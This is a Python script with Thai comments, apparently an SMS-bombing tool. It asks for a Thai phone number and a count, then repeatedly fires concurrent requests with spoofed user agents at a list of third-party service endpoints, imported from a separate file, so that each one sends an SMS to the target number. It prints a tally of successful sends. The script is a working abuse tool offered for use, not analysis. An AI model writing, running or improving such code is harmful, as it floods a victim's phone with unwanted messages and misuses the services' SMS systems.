# program/SMS-Fast.py
import asyncio
import aiohttp
import random
import time
from fake_useragent import UserAgent
from API_LIST import API_CONFIG

ua = UserAgent()

# สถานะ API
api_status = {k: {"active": True, "cooldown": 0} for k in API_CONFIG}
success_count = 0

async def send_request(session, api_key, phone, sem):
    async with sem:
        if not api_status[api_key]["active"] or time.time() < api_status[api_key]["cooldown"]:
            return False
            
        cfg = API_CONFIG[api_key]
        
        # จัดการ URL และ Data
        url = cfg["url"].format(phone=phone) if "{phone}" in cfg["url"] else cfg["url"]
        headers = cfg["headers"]()
        data_input = cfg["data"](phone) if cfg["data"] else None
        
        try:
            kwargs = {"headers": headers, "timeout": 10}
            if isinstance(data_input, dict):
                kwargs["json"] = data_input
            elif isinstance(data_input, str):
                kwargs["data"] = data_input

            async with session.request(cfg["method"], url, **kwargs) as resp:
                if resp.status in (200, 201):
                    text = await resp.text()
                    if cfg["success_check"](text):
                        global success_count
                        success_count += 1
                        print(f"ส่ง SMS สำเร็จครั้งที่ {success_count} | เบอร์ {phone} | API: {cfg['name']}")
                        return True
        except Exception:
            api_status[api_key]["active"] = False
            api_status[api_key]["cooldown"] = time.time() + 10
        return False

async def send_sms(phone, target_successes):
    phone = "".join(filter(str.isdigit, phone.strip()))
    if phone.startswith("66"): phone = "0" + phone[2:]
    elif phone.startswith("+66"): phone = "0" + phone[3:]
    
    if len(phone) != 10:
        print("เบอร์ไม่ถูกต้อง (ต้องมี 10 หลัก)")
        return

    start_time = time.time()
    timeout = 600
    sem = asyncio.Semaphore(20) # คุมจำนวน Thread ไม่ให้เครื่องค้าง

    async with aiohttp.ClientSession() as session:
        while success_count < target_successes and time.time() - start_time < timeout:
            # เลือกเฉพาะ API ที่ Active และหมด Cooldown แล้ว
            active_apis = [k for k, v in api_status.items() if v["active"] and time.time() >= v["cooldown"]]
            
            if not active_apis:
                print("ไม่มี API ที่ใช้งานได้ รอ 3 วินาที...")
                # รีเซ็ตสถานะบางตัวเผื่อกลับมาใช้ได้
                for k in api_status:
                    if time.time() > api_status[k]["cooldown"]:
                         api_status[k]["active"] = True
                await asyncio.sleep(3)
                continue

            tasks = []
            # สุ่มยิง API
            for _ in range(min(20, len(active_apis))):
                api_key = random.choice(active_apis)
                tasks.append(send_request(session, api_key, phone, sem))
                await asyncio.sleep(random.uniform(0.01, 0.05))
            
            await asyncio.gather(*tasks)

    print(f"ส่ง SMS เสร็จสิ้น | สำเร็จ {success_count}/{target_successes} ครั้ง ✅")

if __name__ == "__main__":
    phone = input("กรุณาใส่เบอร์โทรศัพท์: ")
    try:
        target = int(input("กรุณาใส่จำนวนครั้งที่ต้องการส่ง SMS: "))
        asyncio.run(send_sms(phone, target))
    except ValueError:
        print("จำนวนครั้งต้องเป็นตัวเลขจำนวนเต็ม")
